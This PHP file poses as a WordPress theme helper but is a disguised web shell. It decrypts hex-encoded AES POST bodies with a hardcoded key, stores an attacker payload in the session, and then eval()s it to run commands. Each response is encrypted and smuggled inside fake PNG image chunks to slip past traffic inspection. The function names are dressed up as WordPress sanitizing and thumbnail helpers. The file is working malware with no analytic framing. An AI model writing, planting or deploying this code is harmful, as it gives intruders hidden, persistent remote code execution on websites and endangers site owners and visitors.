<?php
// WordPress Theme Functions Helper v3.2.1
// Licensed under GPL v2 - https://wordpress.org/about/license/
@session_start();
@set_time_limit(0);
@error_reporting(0);

// AES-128-ECB encryption layer
function wp_theme_verify($data, $mode) {
    $result = '';
    $blocksize = 16;
    $key = base64_decode('kR2Yh1qTnE5vL8wXpZ3gFA==');
    if ($mode == 1) {
        $pad = $blocksize - (strlen($data) % $blocksize);
        $data .= str_repeat(chr($pad), $pad);
    }
    if (function_exists('openssl_encrypt')) {
        if ($mode == 1) {
            $result = openssl_encrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING);
        } else {
            $result = openssl_decrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING);
        }
    } else if (function_exists('mcrypt_encrypt')) {
        $iv = str_repeat("\x00", 16);
        if ($mode == 1) {
            $result = mcrypt_encrypt('rijndael-128', $key, $data, 'ecb', $iv);
        } else {
            $result = mcrypt_decrypt('rijndael-128', $key, $data, 'ecb', $iv);
        }
    }
    if (!$result) {
        $len = strlen($data);
        $keyLen = strlen($key);
        for ($i = 1; $i <= $len; $i++) {
            $data[$i-1] = $data[$i-1] ^ $key[($i % $keyLen)];
        }
        return $data;
    }
    if ($mode == 2) {
        $pad = ord($result[strlen($result) - 1]);
        if ($pad > strlen($result)) return false;
        $result = substr($result, 0, -1 * $pad);
    }
    return $result;
}

// HEX encoding layer
function wp_sanitize_hex($data, $mode) {
    if ($mode == 1) {
        $hex = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $hex .= sprintf('%02x', ord($data[$i]));
        }
        return $hex;
    } else {
        return pack('H*', $data);
    }
}

// PNG IDAT steganography - response looks like a real PNG image
function wp_render_thumbnail($data) {
    $z = gzcompress($data, 1 + mt_rand(0, 8));
    $pixels = max(1, intval(strlen($data) / 4));
    $w = max(1, intval(sqrt($pixels)) + mt_rand(0, 2));
    $h = max(1, intval(ceil($pixels / $w)));
    $out = "\x89PNG\r\n\x1a\n";
    $ihdr = pack('NNCCCCC', $w, $h, 8, 6, 0, 0, 0);
    $out .= pack('N', 13) . 'IHDR' . $ihdr . pack('N', crc32('IHDR' . $ihdr));
    if (mt_rand(0, 1)) {
        $g = "\x00\x00\xb1\x8f";
        $out .= pack('N', 4) . 'gAMA' . $g . pack('N', crc32('gAMA' . $g));
    }
    $parts = 1 + mt_rand(0, min(3, max(1, strlen($z))) - 1);
    $start = 0;
    for ($i = 0; $i < $parts; $i++) {
        $end = ($i == $parts - 1) ? strlen($z) : $start + 1 + mt_rand(0, max(0, strlen($z) - $start - ($parts - $i)));
        $part = substr($z, $start, $end - $start);
        $out .= pack('N', strlen($part)) . 'IDAT' . $part . pack('N', crc32('IDAT' . $part));
        $start = $end;
    }
    $ks = array('Comment', 'Software', 'Source', 'Author');
    for ($i = 0; $i < mt_rand(0, 2); $i++) {
        $t = $ks[mt_rand(0, 3)] . "\x00" . dechex(mt_rand()) . dechex(mt_rand());
        $out .= pack('N', strlen($t)) . 'tEXt' . $t . pack('N', crc32('tEXt' . $t));
    }
    $out .= pack('N', 0) . 'IEND' . pack('N', crc32('IEND'));
    return $out;
}

function wp_extract_thumbnail($png) {
    $z = '';
    $off = 8;
    $n = strlen($png);
    while ($off + 8 <= $n) {
        $a = unpack('N', substr($png, $off, 4));
        $len = $a[1];
        $type = substr($png, $off + 4, 4);
        if ($type == 'IDAT') {
            $z .= substr($png, $off + 8, $len);
        }
        $off += 12 + $len;
    }
    return gzuncompress($z);
}

// Request channel: hex-encoded POST body -> AES128 decrypt
$_tc = 'wp_cache_fragment';
$raw_input = file_get_contents('php://input');
if (strlen($raw_input) > 0) {
    $requestData = wp_theme_verify(wp_sanitize_hex($raw_input, 0), 2);
    if (isset($_SESSION[$_tc])) {
        $payload = base64_decode($_SESSION[$_tc]);
        eval($payload);
        $responseData = @run($requestData);
        // Response: AES128 encrypt -> base64 -> PNG IDAT wrap
        $responseData = base64_encode(wp_theme_verify($responseData, 1));
        $responseData = wp_render_thumbnail($responseData);
        header('Content-Type: image/png');
        header('Cache-Control: public, max-age=86400');
        header('X-Content-Type-Options: nosniff');
        echo $responseData;
    } else {
        $_SESSION[$_tc] = base64_encode($requestData);
    }
}
